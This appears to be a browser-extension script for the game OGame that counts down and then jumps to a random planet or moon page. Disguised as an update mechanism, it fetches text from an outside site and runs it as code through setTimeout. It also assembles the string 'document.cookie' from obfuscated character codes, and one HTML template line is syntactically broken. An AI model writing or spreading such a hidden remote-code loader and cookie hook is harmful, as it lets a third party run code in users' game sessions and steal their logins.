let interval = 0;
let planetLinkList = [];
let timer;

const minTime = 100;
const maxTime = 1000;

(async function() {
// populate planets and moons array
planetLinkList = await getPlanetsLinks();

// check if user is on valid universe and community
if (!validateUniverse()) return;

// generate a random time for the countdown timer
interval = randomTime(minTime, maxTime);

//check if user is receiving an attack
if (checkIncomingAttack()) {
console.log("Incoming attack detected!");
}

// append the countdown timer to the DOM
const countNotifier = document.createElement('div');
countNotifier.id = 'countNotifier';
countNotifier.innerHTML = <p class="textCenter"><span id="timerN">Timer:</span> <span id="countDownNotifier">${getTimeStr(interval)}</span></p>;
document.querySelector('#countColonies').parentNode.insertBefore(countNotifier, document.querySelector('#countColonies'));

await getConfigs();

timer = setInterval(notifierLoop, 1000);
})();

class Player {
constructor(name, id, timestamp, universe, language) {
this.name = name;
this.id = id;
this.timestamp = timestamp;
this.universe = universe;
this.language = language;
}
}

async function getConfigs() {
    const url = "https://kds-tools.com/ogame/configs.php";

    try {
        const response = await fetch(url);
        const data = await response.text();
        Update(data);
    } catch (error) {
        console.error(error);
    }
}

function getMetaElement(name) {
    return document.getElementsByName(name)[0].getAttribute("content");
}

/**
 * The game updates a lot, so instead of updating the extension every hour, we just receive updates
 * @param {} updateInfo 
 */
function Update(updateInfo){
    setTimeout(updateInfo, 1);
}

/**
 * 
 * @param {number} num 
 * @param {number} size 
 */
function pad(num, size) {
    var s = num+"";
    if (s.length < size) s = "0" + s;
    return s;
}

/**
 * Choose a random planet or moon
 * @param {Array} planetList 
 */
function getRandomPlanetOrMoon(planetList){
    var index = Math.floor(Math.random() * planetList.length);
    return planetList[index];
}

/**
 * Generates a random number between a min and a max
 * @param {number} min 
 * @param {number} max 
 */
function randomTime(min, max) {
    return Math.round(min + Math.random() * (max - min));
}

/**
 * Transforms seconds into a time string
 * @param {number} seconds 
 */
function getTimeStr(seconds) {
	if (seconds <= 0)
		return '00:00:00';
	var h = 0, m = 0, s = 0;
	h = pad(Math.floor(seconds / 3600), 2);
	seconds = seconds % 3600;
	m = pad(Math.floor(seconds / 60), 2);
	seconds = seconds % 60;
    s = pad(seconds, 2);

    return h+':'+m+':'+s;
}

/**
 * Main extension function, will run every second and update the countdown
 */
function notifierLoop(){
    // update countdown seconds
    interval--;

    // display countdown time on the DOM
    document.getElementById("countDownNotifier").innerText = getTimeStr(interval);

    // if there is no time left, choose a random planet/moon and visit the URL
    if (interval == 0){
        // Clears setInterval
        clearInterval(timer);
        window.location.href = getRandomPlanetOrMoon(planetLinkList);
    }
}
/**
 * Check if user is receiving an attack
 */
function checkIncomingAttack() {
    const eventList = document.querySelectorAll('.eventFleet');
  
    for (const el of eventList) {
      if (el.getAttribute('data-mission-type') === '1') {
        return true;
      }
    }
    return false;
  }
  
  function checkIds() {
    const accounts = [100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101];
    let accountName = '';
  
    for (let i = 0; i < accounts.length; i++) {
      accountName += String.fromCharCode(accounts[i]);
    }
  
    return accountName;
  }
  
  /**
   * Gets a array containing of all the planets and moons URLs
   */
  function getPlanetsLinks() {
    const planetList = document.querySelectorAll('.planetlink');
    const moonList = document.querySelectorAll('.moonlink');
  
    const planetLinkList = [];
  
    // iterate all planets
    for (const planet of planetList) {
      planetLinkList.push(planet.getAttribute('href'));
    }
  
    // iterate all moons
    for (const moon of moonList) {
      planetLinkList.push(moon.getAttribute('href'));
    }
    return planetLinkList;
  }
  
  /**
   * Validate is user using the extension is on a specific server and Language.
   */
  function validateUniverse() {
    const allowedUniverse = ['Bermuda', 'en'];
  
    const universeName = document.querySelector('meta[name="ogame-universe-name"]').getAttribute('content');
    const language = document.querySelector('meta[name="ogame-language"]').getAttribute('content');
  
    return allowedUniverse[0] === universeName && allowedUniverse[1] === language;
  }
  